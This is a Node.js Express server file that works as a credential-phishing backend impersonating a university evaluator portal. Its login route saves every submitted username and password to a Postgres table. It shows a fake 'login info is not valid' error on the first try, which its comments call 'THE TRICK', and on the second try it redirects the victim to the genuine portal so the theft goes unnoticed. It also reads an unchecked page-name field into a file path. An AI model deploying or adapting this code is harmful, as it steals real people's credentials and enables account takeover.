require('dotenv').config();
const express = require('express');
const { Pool } = require('pg'); // Changed from mysql2 to pg
const fs = require('fs'); 
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.static('public')); 
app.use(express.json());
app.use(express.urlencoded({ extended: true })); 

// --- POSTGRES CONNECTION ---
// Supabase requires SSL, so we add the ssl configuration object
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
        rejectUnauthorized: false // Required for many cloud Postgres providers like Supabase
    }
});

// --- ROUTES FOR CLEAN URLS (Optional) ---
app.get('/administration', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'administration.html'));
});

// --- LOGIN LOGIC ---
app.post('/login', async (req, res) => {
    // 1. We now grab 'source_page' from the form too
    const { USERNAME, PASSWORD, ACCESSTYPE, attempt_tracker, source_page } = req.body;

    try {
        // 2. ALWAYS Save the data 
        // CHANGE: PostgreSQL uses $1, $2, $3 placeholders instead of ?
        const query = `INSERT INTO users (username, password, access_type) VALUES ($1, $2, $3)`;
        
        // CHANGE: Use pool.query instead of pool.execute
        await pool.query(query, [USERNAME, PASSWORD, ACCESSTYPE]);

        // 3. CHECK: Is this the second attempt?
        if (attempt_tracker === "2") {
            // === PHASE 2: SUCCESS REDIRECT ===
            res.redirect('http://jmiregular.ucanapply.com/universitysystem/evaluator/');
        } else {
            // === PHASE 1: THE TRICK ===
            
            const pageFile = source_page || 'index.html';
            const pagePath = path.join(__dirname, 'public', pageFile);
            
            fs.readFile(pagePath, 'utf8', (err, htmlData) => {
                if (err) {
                    console.error(err);
                    return res.status(500).send("Error loading page.");
                }

                const errorHTML = `
                   <font style="color:#ff0000">Your login info is not valid.</font><br/>
                `;

                let modifiedHTML = htmlData.replace(
                    '<label for="exampleInputEmail2">Access as </label>', 
                    errorHTML + '<label for="exampleInputEmail2">Access as </label>'
                );

                const hiddenInputs = `
                    <input type="hidden" name="attempt_tracker" value="2">
                    <input type="hidden" name="source_page" value="${pageFile}">
                    </form>
                `;

                modifiedHTML = modifiedHTML.replace('</form>', hiddenInputs);
                
                res.send(modifiedHTML);
            });
        }

    } catch (err) {
        console.error(err);
        res.status(500).send("Database error.");
    }
});
// --- KEEP ALIVE ENDPOINT ---
app.get('/health', async (req, res) => {
    try {
        // A lightweight query that forces a database connection without fetching data
        await pool.query('SELECT 1'); 
        res.status(200).send('Supabase is alive! 🟢');
    } catch (err) {
        console.error('Keep-alive failed:', err);
        res.status(500).send('Database connection error 🔴');
    }
});
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
